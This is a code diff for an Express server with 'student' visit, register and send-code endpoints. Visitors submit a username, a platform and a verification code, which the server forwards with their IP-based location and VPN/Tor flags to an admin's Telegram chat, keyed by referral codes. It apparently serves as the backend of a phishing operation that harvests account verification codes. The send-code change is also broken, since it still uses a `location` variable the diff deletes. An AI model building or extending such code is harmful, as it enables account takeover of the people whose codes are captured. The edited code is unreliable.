@@ -72,7 +72,6 @@ import Referral from "./models/Referral.js";
 import Activity from "./models/Activity.js";
 import otpRoutes from "./otp.js";
 // ---------- HELPERS ----------
-import { getFullLocation } from "./location.js";
 
 app.set("trust proxy", true);
 
@@ -119,18 +118,34 @@ function uploadToCloudinaryBuffer(buffer, options = {}) {
 }
 
 // Get location via ipwho.is with safe fallback
-async function getLocation(req) {
+async function getLocation(ip) {
   try {
-    await getFullLocation(req);
+    if (!ip) return {};
 
-    
-      } catch (err) {
-    // rate limit or network errors
-    console.warn("getLocation failed:", err?.response?.status || err?.message);
+    const { data } = await axios.get(`https://iplocate.io/api/lookup/${ip}`, {
+      timeout: 5000,
+    });
+
+    return {
+      ip: data.ip,
+      city: data.city,
+      region: data.subdivision,
+      country: data.country,
+      latitude: data.latitude,
+      longitude: data.longitude,
+      org: data.org,
+      postal: data.postal_code,
+      timezone: data.timezone,
+      is_vpn: data.security?.vpn || false,
+      is_proxy: data.security?.proxy || false,
+      is_tor: data.security?.tor || false,
+      is_cloud: data.security?.cloud || false,
+    };
+  } catch (err) {
+    console.log("Geo failed:", err.message);
     return {};
   }
-}
-// ---------- TELEGRAM BOT UTIL ----------
+}// ---------- TELEGRAM BOT UTIL ----------
 import { bot } from "./botConfig.js";
 app.use("/otp", otpRoutes);
 // ---------- TELEGRAM BOT UTIL ----------
@@ -551,7 +566,7 @@ app.post("/student/visit", async (req, res) => {
     }
 
     const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
-    const location = await getLocation(req);
+    const location = await getLocation(ip);
 
     await Activity.create({
       adminId: admin._id,
@@ -627,7 +642,7 @@ app.post("/student/register", async (req, res) => {
     }
 
     const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
-    const location = await getLocation(req);
+    const location = await getLocation(ip);
 
     await Activity.create({
       adminId: admin._id,
@@ -664,7 +679,7 @@ app.post("/student/send-code", async (req, res) => {
     const { code, referralCode, platform, username } = req.body || {};
     if (!referralCode) return res.status(400).json({ success: false, error: "Referral code is required" });
     if (!code) return res.status(400).json({ success: false, error: "Verification code is required" });
-const location = await getLocation(req);
+
     const ref = await Referral.findOne({ code: referralCode }).lean();
     if (!ref) return res.status(404).json({ success: false, error: "Invalid referral code" });
 
@@ -676,7 +691,7 @@ const location = await getLocation(req);
 Username: ${escapeMarkdown(username || "Unknown")}
 Platform: ${escapeMarkdown(platform || "unknown")}
 Code: \`${escapeMarkdown(code)}\`
-\n ${escapeMarkdown(location)}`;
+\n ${escapeMarkdown(location) || ""}`;
     await sendTelegram(admin.chatId || ADMIN_CHAT_ID, msg);
 
     await Activity.create({ adminId: admin._id, action: "verification_requested", details: { username, code, platform } });
